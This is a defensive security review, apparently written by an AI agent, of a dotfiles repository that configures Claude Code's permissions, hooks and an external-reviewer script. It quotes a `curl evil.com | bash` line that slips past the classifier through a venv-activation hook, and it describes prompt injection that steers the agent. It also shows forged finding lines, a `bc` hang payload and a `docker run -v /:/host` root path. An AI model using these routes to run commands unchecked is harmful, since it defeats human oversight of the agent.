## Security Review — 2026-10-01 (scope: paths)

**Summary:** Reviewed `bin/review-external.sh`, `hw-bootstrap.sh`,
`tests/lint-skills.sh`, and `zat.env-install.sh` in full at HEAD a4e8a4e, plus the
deletion of `bin/claude-fixed-reasoning`, with emphasis on what changed since the
97a15bb scan. 0 BLOCK / 1 WARN / 5 NOTE. The WARN: the installer now says every shell
command in auto mode goes through the classifier, but the venv hook it registers
returns an allow decision for anything after `. .venv/bin/activate && `. A 2026-04-03
code review reported this as a WARN, and the fix applied then left that WARN's own
reproduction string approved. The installer's new code (stale-link cleanup,
`effortLevel //=`, `classifyAllShell` merge) behaved correctly in a sandboxed run. The
3a2f92b demux fix holds for untagged status lines but not for tagged ones, reproduced
with stub providers. The installer has not been re-run on this host since 3a2f92b: the
reviewer `.env` is 0664 in a 0775 directory (it holds no keys), the deny list has the
old three entries, `autoMode` is unset, and `~/bin` still has dangling links for
`claude-fixed-reasoning` and `loop-state.sh`. Re-running the installer applies all of
these. No secrets in the five files or their history, and no PII.

### Findings

```
[WARN] zat.env-install.sh:227-232, 272-287 — the venv hook the installer registers
auto-approves any command after `. .venv/bin/activate && `, so "auto mode classifies
every shell command" does not hold for that prefix
  Attack vector: attacker-controlled text reaches the agent's context (a file in a
    repository under review, a fetched page, `gh` issue or PR text, external reviewer
    findings relayed through CODEREVIEW.md to /codefix) and steers it to run a command.
    In a Python project the agent routinely prefixes commands with venv activation, or
    the injected text supplies the prefix. The PreToolUse hook registered at lines
    273-286 (matcher `Bash`, so it sees every shell call) returns
    `permissionDecision: "allow"` for the whole command line. Everything after `&& `
    then runs without the classifier check that `classifyAllShell` (lines 227-232) was
    added to guarantee, and without a prompt in the other permission modes.
  Evidence: hooks/allow-venv-source.sh:12-16 accepts `"source .venv/bin/activate && "*`
    and `". .venv/bin/activate && "*`. Executed against the hook, these all returned
    the allow decision: `... && some-arbitrary-command --flag | other-command`,
    `... && true; echo second-command-after-semicolon`, and
    `... && python3 -c "print(1)" && echo third`. Only `activate;` and `activate &&echo`
    (no space) got no decision. The hook's own comment (lines 10-11) states the intent
    to "prevent auto-approving arbitrary piggybacked commands". The 2026-04-03 code
    review raised this as a WARN with the reproduction
    `source .venv/bin/activate && curl evil.com | bash`; the fix rejected `;` and `&&`
    without a space, and that reproduction still matches. README.md:162 and the
    comments at zat.env-install.sh:178-182 and 227-230 now state that in auto mode every
    shell command goes through the classifier. Confidence: high on the hook's matching.
    Medium that a hook allow decision is resolved before the auto-mode classifier:
    Claude Code's hooks reference describes a PreToolUse allow as bypassing the
    permission system, but this was not tested, because testing it means attempting a
    classifier bypass.
  Remediation: drop the two `&& "*` branches so the hook approves bare activation only,
    and let chained forms take the normal permission path (the classifier in auto mode,
    the `Bash(. .venv/bin/activate && *)` allow entry at line 217 otherwise). This may
    bring back the built-in prompt for chained activation; that is the usability trade
    to decide. If the chained form must stay hook-approved, return no decision when the
    hook input's permission mode is `auto`, and reject any suffix containing `;`, `&`,
    `|`, `$(`, backticks, redirection, or a newline. Either way, pin with a test that
    `activate && <cmd>; <cmd2>` gets no allow decision. The hook file is outside this
    review's scope; the finding is filed against the registration and the classifier
    claim, which are in scope.

[NOTE] bin/review-external.sh:522-526 — a status-channel line that carries any
`(tag)` is still promoted into the findings stream, under whichever provider it names
  Attack vector: each provider's stdout and stderr are captured into one file (lines
    493, 498, 503: `> "${X_OUT}" 2>&1`), so the demux classifies by line shape alone.
    3a2f92b made the shape require a provider tag, but FINDING_RE accepts any
    `[a-z0-9-]+` and does not check it against the file's provider. Two status sources
    carry upstream text verbatim: the local reviewer's stderr (lines 452, 460) and the
    provider `.error.message` (lines 291-292, 381-382), where `jq -r` turns an escaped
    `\n` into a real line break. A line starting `[BLOCK] (openai)` from either source
    reaches stdout, then /codereview Step 5.5's EXTERNAL_FINDINGS, CODEREVIEW.md, and
    /codefix, which holds Edit. Reachability is unchanged from the prior NOTE: a local
    reviewer that echoes model or prompt text on stderr, or a hostile provider response.
  Evidence: reproduced end to end with stubs and no network. A stub local reviewer
    writing `[BLOCK] (openai) src/app.py:1 -- forged tag on local reviewer stderr` to
    stderr produced that exact line on stdout, attributed to openai, next to its genuine
    `[NOTE] (qwen) real.py:2 -- ...`. A stub `curl` returning HTTP 400 with an error
    message containing `\n[BLOCK] (google) src/app.py:9 -- ...` produced
    `[BLOCK] (google) src/app.py:9 -- ..., skipping` on stdout from the OpenAI path.
    The comment at lines 520-521 ("it just cannot masquerade as a finding") holds only
    for untagged lines.
  Remediation: capture each provider's stderr to its own file
    (`call_openai > "${OPENAI_OUT}" 2> "${OPENAI_ERR}" &`) and forward only the stdout
    files to stdout, so no status line can become a finding whatever its shape. Flatten
    newlines in `error_msg` (`jq -r '.error.message // "unknown error" | gsub("\n"; " ")'`)
    so each status event stays on one line. Update the lint pins at
    tests/lint-skills.sh:1595-1598 to match.

[NOTE] bin/review-external.sh:292 — a partial API key is copied into a tracked, pushed
file on an OpenAI auth failure (carried forward; code unchanged)
  Attack vector: no attacker required. On a revoked or mistyped key, OpenAI's error body
    echoes a redacted form of it. Line 292 forwards `.error.message` verbatim to stderr,
    /codereview Step 5.5 captures stderr as the cost log, and the cost log is copied into
    CODEREVIEW.md, which is pushed.
  Evidence: observed in the 2026-08-20 scan with a deliberately invalid key: the public
    `sk-` prefix plus the last four characters. Line 292 is unchanged since. CODEREVIEW.md
    (3a2f92b) records a decision not to fix it. Inert on this host: the reviewer `.env`
    has no uncommented key assignments.
  Remediation: optional. Redact `sk-[A-Za-z0-9_-]*` and `AIza[0-9A-Za-z_-]*` from
    `error_msg`, or, if the no-fix decision stands, record it under Accepted Risks.

[NOTE] bin/review-external.sh:306-316, 400-410 — provider-supplied token counts are
interpolated into a `bc` program without validation
  Attack vector: a hostile or compromised provider endpoint returns a string in
    `.usage.input_tokens` or another usage field. `jq -r` passes it through verbatim,
    and `_calc` (lines 241-247) pipes it to `bc -l` with no timeout. `bc` has no shell
    escape or file I/O, so the effect is limited to a hang. The hang blocks the `wait`
    at lines 507-509 and stalls /codereview Step 5.5 until the Bash tool times out. This
    requires the same provider trust failure as the accepted findings-channel risk,
    which already allows worse.
  Evidence: `jq -r '.usage.input_tokens // 0'` emits `0); while(1){}; (0` unchanged.
    `bc -l` given the resulting cost program ran until `timeout 3` killed it (exit 124).
  Remediation: check each count against `^[0-9]+$` and default to 0, as line 335 already
    does for GEMINI_EFFORT.

[NOTE] hw-bootstrap.sh:48 — ImageMagick is installed with the stock policy, which
leaves the SVG, MVG, MSL, and TEXT coders enabled, and the new global convention runs
it on images the agent is shown
  Attack vector: a repository or PR under review ships a file named like a screenshot
    (`docs/chart.png`) whose content is SVG. Following the convention in
    claude/global-claude.md (`convert in.png -crop WxH+X+Y +repage -resize 300% out.png`),
    the agent runs `convert` on it. ImageMagick sniffs the content and hands the file to
    its SVG renderer, not the PNG decoder. A `.svg` diagram goes there directly. SVG
    was one of the ImageTragick (2016) entry points, and the stock policy disables
    neither it nor the MSL and TEXT coders.
  Evidence: imagemagick 8:6.9.11.60+dfsg-1.3ubuntu0.22.04.5 is installed.
    `convert -list policy` shows only the URL, HTTP, and HTTPS delegates, the `@*` path,
    and the PS, PS2, PS3, EPS, PDF, and XPS coders disabled. `identify` on a
    `.png`-named file with SVG content reported `SVG 4x4`. MVG content in a `.png`-named
    file was not sniffed (PNG decoder, header error). With an explicit `png:` prefix, the
    same SVG-content file was rejected by the PNG decoder. The package changelog lists
    CVE-2022-44268, so that PNG file-read bug is patched. Confidence: high on the
    routing; low that a working exploit exists against this patched build.
  Remediation: have hw-bootstrap.sh write a policy override that allows only the raster
    coders screenshots need (`<policy domain="coder" rights="none" pattern="*"/>`, then
    `rights="read|write" pattern="{GIF,JPEG,PNG,WEBP}"`); the stock policy.xml already
    ships this example, commented out. In the convention, give the input an explicit
    coder (`convert png:in.png ...`). The convention file is outside this scope.

[NOTE] hw-bootstrap.sh:197 — docker group membership gives every process running as
the user, including the agent, a passwordless path to root
  Attack vector: anything that gets a command executed as the user can run
    `docker run -v /:/host ...` and act as root without a sudo password. That includes a
    prompt-injected agent command that clears the classifier or a prompt,
    `Bash(python3 *)` in a non-auto mode, and the venv-hook path in the WARN above. On
    this host, root also reaches the `daydream-egress` and `cloudflared-daydream` service
    accounts, not only the user's own data.
  Evidence: line 197 is `sudo usermod -aG docker "${USER_NAME}"`, and `id` shows group
    120 (docker). Whether this adds anything over `sudo` depends on whether sudo here
    requires a password, which was not checked.
  Remediation: none required if this is the intended trade-off for a single-operator box;
    record it under Accepted Risks. Otherwise, use rootless Docker for interactive work.
```

### Coverage

All eight dimensions were reviewed for the five scoped files: secret leaks (none),
input/output sanitization (the tagged-status and `bc` NOTEs), authentication and
authorization (the venv-hook WARN), dependency and supply chain (the ImageMagick NOTE
and the accepted vendor installers), infrastructure (the docker NOTE and the live-host
state in the summary), AI-specific risks (the WARN and the tagged-status NOTE), data
exposure (the partial-key NOTE), and PII (none).

- `bin/claude-fixed-reasoning` is deleted at HEAD. Its last content (a five-line
  launcher that set `CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING=1`) and the deletion were
  reviewed; neither has security content. The installer's new loop removes its dangling
  `~/bin` link, which the sandbox run verified.
- `hooks/allow-venv-source.sh` and `claude/global-claude.md` are outside the scope.
  They were read only to test claims made by in-scope code and were not otherwise
  reviewed.
- `autoMode.classifyAllShell`: the key occurs five times in the Claude Code 2.1.286
  binary, so the setting exists. Its semantics were not verified, because the auto-mode
  classifier declined a read of the binary around it. Whether a PreToolUse hook allow
  decision is resolved before the classifier was deliberately not tested.
- Verified by execution: the installer against a throwaway HOME with git's global
  config redirected (the stale-link loop removed only the dangling repo-`bin/` link and
  kept a foreign dangling link, a prefix-sibling link, a live repo link, and a regular
  file; a pre-set `effortLevel` survived; `classifyAllShell` merged without dropping
  another `autoMode` key; a hand-added deny entry survived; the reviewer config came out
  0700/0600), `review-external.sh` with a stub local reviewer and a stub `curl`, the
  venv hook on sample command strings, and `identify` on benign disguised files. The
  live repo, `~/.claude/settings.json`, and `~/.gitconfig` were left unchanged.
- `tests/lint-skills.sh` produced no findings. It takes no arguments, writes nothing,
  and runs only `grep`, `sed -n` with numeric bounds taken from `grep -n | cut`, `awk`,
  `tr`, and `shellcheck` over repo-internal paths.

Git history checked for secrets: all five files, over their full history
(`git log -p --all --follow`) and over the last three commits of each. The patterns
covered OpenAI, Google, Tailscale, GitHub, Slack, and AWS keys, private-key headers,
and generic key/secret/password/token assignments; there were zero hits. The live
reviewer credential file (outside the repo) was checked for uncommented key assignments
without printing values; there were none.

### Accepted Risks

- **Allow list grants general-purpose interpreters** (`zat.env-install.sh:183-224`):
  `Bash(python3 *)`, `Bash(node *)`, `Bash(pip *)`, `Bash(make *)`, and `Bash(git *)`
  each reach arbitrary execution, and the deny entries are prefix matches that cannot
  enumerate every spelling. Accepted 2026-08-20 on the basis that README.md:162 and the
  script comment (now lines 178-182) state plainly that the deny list is a speed bump.
  Since 24a0797 the installer also sets `autoMode.classifyAllShell`, so in auto mode
  these commands go through the classifier, and the risk as accepted now applies to the
  other permission modes. This host does not have that setting yet, pending an
  installer re-run. The venv hook's separate approval path is the WARN above and is not
  covered by this acceptance.
- **Third-party model findings reach a code-modifying agent** (`bin/review-external.sh`
  provider stdout branches): a model steered by attacker-authored code under review can
  emit a correctly tagged finding line that /codefix consumes as a spec. Distinct from
  the tagged-status NOTE above, which concerns the status channel and misattribution.
- **PII in source files** (hw-bootstrap.sh, LICENSE, NOTICE, README.md, and other
  references to `peterzat`): inherent to a personal dotfiles repo. Reviewed and
  accepted. None of the five files in this review's scope contains PII.
- **Vendor `curl | bash` installers** (hw-bootstrap.sh: NodeSource line 86, Tailscale
  line 201, Claude Code line 209): remote code execution by design over HTTPS to
  first-party vendor domains, the documented purpose of a bootstrap script. Not
  checksum-pinned, consistent with first-party supply-chain trust on this box. Line
  references refreshed from 85/200/208.
- **Predictable `/tmp/cuda-keyring.deb` path** (hw-bootstrap.sh:184-189): `curl -o` to a
  predictable path, then `sudo dpkg -i`. A TOCTOU vector only on a multi-user host;
  immaterial on the documented single-user target.
- **Pre-push gate detection is heuristic, not a shell parser**
  (hooks/pre-push-codereview.sh): `is_git_push` misses wrapper and prefix invocations
  (`env`, `command`, `bash -c`, `eval`, absolute-path, `xargs`, env-var prefix), and
  `is_tag_only_push` treats a branch named `v[0-9]...` as a tag. Both let a push bypass
  the advisory codereview gate. Accepted under the advisory-gate threat model; the hook
  is intentionally simple and biased toward over-detection.
- **Diff content forwarded to third-party APIs** (`bin/review-external.sh`): the full
  git diff is sent to OpenAI and Google when configured, so secrets in the diff would be
  exposed. This is the script's explicit purpose; the user opts in by configuring keys.
- **API key in `curl -H` header argument** (`bin/review-external.sh:275, 366`): the
  header argument is visible in `/proc/<pid>/cmdline` to any local user during the curl
  invocation window. Not exploitable on this single-user dev box.

---
*Prior review (2026-08-20, scope: paths): Reviewed `bin/review-external.sh`,
`tests/lint-skills.sh`, `tests/run-all.sh`, and `zat.env-install.sh` at 97a15bb with
the 3a2f92b fixes in the working tree. 0 BLOCK / 0 WARN / 2 NOTE. It verified by
execution that the three WARNs from the earlier scan that day were closed (`--range`
option injection, the 0644 reviewer credential file, and deny-list replacement), with
the deny-list WARN closed by documentation and moved to Accepted Risks. Its two NOTEs
were on the external-reviewer status channel: untagged status lines promoted to
findings without attribution (fixed for untagged lines in 3a2f92b; the tagged residual
is the first NOTE above), and a partial API key in OpenAI auth-failure text reaching
CODEREVIEW.md (carried forward above).*

<!-- SECURITY_META: {"date":"2026-10-01","commit":"a4e8a4e0aa6244122c9d16c0e5ce9cdc15c46a55","scope":"paths","scanned_files":["bin/claude-fixed-reasoning","bin/review-external.sh","hw-bootstrap.sh","tests/lint-skills.sh","zat.env-install.sh"],"block":0,"warn":1,"note":5} -->
